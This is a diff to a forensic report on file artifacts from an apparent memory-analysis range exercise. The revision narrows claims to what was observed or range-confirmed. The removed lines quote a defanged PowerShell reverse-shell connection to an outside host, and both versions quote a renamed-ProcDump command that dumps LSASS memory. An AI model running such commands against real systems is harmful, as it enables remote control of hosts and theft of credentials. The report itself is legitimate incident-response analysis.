@@ -7,99 +7,83 @@
 
 ## 1. Objective
 
-Recover and analyze malicious file artifacts identified in memory and determine their role in the compromise.
+Record what the surviving notes establish about the file names involved in the exercise,
+and what they do not.
 
-## 2. Identified Malicious Files
+## 2. File Names Under Review
 
-| File | Path | Purpose |
-|------|------|----------|
-| svchost.bat | C:\Windows\System32\svchost.bat | Reverse shell / C2 script |
-| lsass.exe (masqueraded) | C:\Windows\lsass.exe | Renamed ProcDump |
-| lsass.dmp | C:\Windows\lsass.dmp | LSASS credential dump |
+| File | Path | What is recorded |
+|------|------|------------------|
+| svchost.bat | C:\Windows\System32\svchost.bat | MFT entry observed; malicious role range-confirmed |
+| lsass.exe | C:\Windows\lsass.exe | Image path of PID 1576 observed (cmdline, psinfo) |
+| lsass.dmp | not recorded | Output name in PID 1576's command line; no file observed |
 
-## 3. svchost.bat Analysis
+No file content was recovered for any of the three.
 
-### Discovery Method
+## 3. svchost.bat
 
-- Located via `strings_out.txt`
-- Timeline confirmed via `mftparser`
+### MFT entry (observed)
 
-**Command used**:
+Command as recorded (image path normalised to `memory.dmp`):
 
-`python vol.py -f memory.dmp --profile=Win10x64_17763 mftparser --output-file=mftparser.json`
+```
+python vol.py -f memory.dmp --profile=Win10x64_17763 -g 0xf8034da8a4d8 mftparser --output-file="mftparser.json"
+```
 
-**Creation Time (UTC)**:
-
-`2023-02-03 13:25:04`
-
-**Embedded Behavior**
-
-Recovered string (defanged):
-
-`$client = New-Object System.Net.Sockets.TCPClient('10[.]0[.]128[.]2',4337);`
-
-**Behavior summary**:
-
-- Establishes outbound TCP connection
-- Executes received commands via iex
-- Sends output back to remote host
-- Implements interactive reverse shell
-
-## 4. Masqueraded LSASS Binary
-Identified via `psxview` and `cmdline`.
-
-**Command line**:
-
-"C:\Windows\lsass.exe" -accepteula -ma 656 lsass.dmp
-
-**Analysis**:
-- Path differs from legitimate LSASS
-- Accepts EULA automatically
-- Uses -ma full memory dump switch
-- Targets legitimate LSASS PID (656)
-- Drops output file lsass.dmp
-
-**Conclusion**:
-
-Renamed Sysinternals ProcDump used for credential dumping.
-
-## 5. LSASS Dump Artifact
-**Dump target**:
-
-- `PID: 656` (legitimate LSASS)
-
-**Output file**:
-
-- `lsass.dmp`
-
-**Forensic Implication**:
-- Offline credential extraction likely possible
-- Potential credential compromise across domain or local accounts
-- High-severity impact
-
-## 6. Artifact Timeline Correlation
-| Time (UTC) | Artifact |
+| Field | Recorded value |
 | :--- | :--- |
-| 13:23:40 | PowerShell execution begins |
-| 13:25:04 | `svchost.bat` created |
-| 13:29:30 | Masqueraded `lsass.exe` executed |
-| 13:29:33 | Memory captured |
+| Record number | 1772 |
+| Attribute | In Use & Directory |
+| Link count | 1 |
+| `$STANDARD_INFORMATION` creation, modification, MFT-change, access | `2023-02-03 13:25:04 UTC+0000` (all four) |
+| `$FILE_NAME` values | not recorded |
 
-## 7. MITRE ATT&CK Mapping
-| Technique | ID | Evidence |
+The entry's name is `Windows\System32\svchost.bat`. Its attribute field reads
+`In Use & Directory`; the notes do not resolve that against the `.bat` name.
+`$STANDARD_INFORMATION` values can be altered, so the value is reported as recorded.
+
+### Content association (range-confirmed)
+
+The exercise states that the attacker created this file and that it communicated with
+`10[.]0[.]128[.]2:4337`. The range-supplied `strings_out.txt` contains PowerShell code that
+opens a TCP client to that endpoint (see [Network Analysis](network-analysis.md)); the notes
+record no link between that string and the file. The file's actual content, its creator and
+any execution are not recorded.
+
+R-Studio appears in the notes only as the range's suggested recovery route; no file was
+recovered.
+
+## 4. Masqueraded lsass.exe
+
+Observed command line (cmdline): `"C:\Windows\lsass.exe" -accepteula -ma 656 lsass.dmp`
+
+- The image path is `C:\Windows\lsass.exe`, not the legitimate `C:\Windows\system32\lsass.exe`.
+- The target PID is 656, the legitimate LSASS.
+- Range-confirmed: the process is a renamed Sysinternals tool.
+- Analyst inference: the arguments match ProcDump's full-memory-dump syntax.
+- No hash, signature or version information was recorded for the binary.
+
+## 5. lsass.dmp
+
+`lsass.dmp` is the output name given in PID 1576's command line, relative to a working
+directory that was not recorded. `filescan` and `dumpfiles` were not run, so neither the
+file's existence nor its location is established, and no credential material was
+observed.
+
+## 6. MITRE ATT&CK Alignment
+
+ATT&CK Enterprise v19.2; full dispositions in the [MITRE ATT&CK Mapping](mitre-attack-mapping.md).
+
+| Technique | ID | Basis |
 | :--- | :--- | :--- |
-| **Command Shell** | T1059.003 | `svchost.bat` reverse shell |
-| **Credential Dumping** | T1003.001 | LSASS memory dump |
-| **Masquerading** | T1036 | Renamed `lsass.exe` binary |
-| **Ingress Tool Transfer** | T1105 | Reverse shell C2 |
+| Masquerading | T1036 | `lsass.exe` name with non-System32 path observed; renaming range-confirmed |
+| OS Credential Dumping: LSASS Memory | T1003.001 | Dump invocation observed; outcome not established |
 
-## 8. File Artifact Conclusion
-- **Malicious File Creation**: Confirmed
-- **Credential Dump Generated**: Confirmed
-- **Reverse Shell Script**: Confirmed
-- **Masquerading Behavior**: Confirmed
+## 7. File Artifact Conclusion
 
-File artifacts directly support credential theft and active command-and-control activity.
-
-
----
+- **Observed:** an MFT entry for `svchost.bat` with `$STANDARD_INFORMATION` values of
+  `2023-02-03 13:25:04 UTC`; the masqueraded image path `C:\Windows\lsass.exe`.
+- **Range-confirmed:** `svchost.bat` was attacker-created and used for communication; the
+  masqueraded image is a Sysinternals tool.
+- **Not established:** the content or execution of `svchost.bat`; the existence of
+  `lsass.dmp`; any credential compromise.
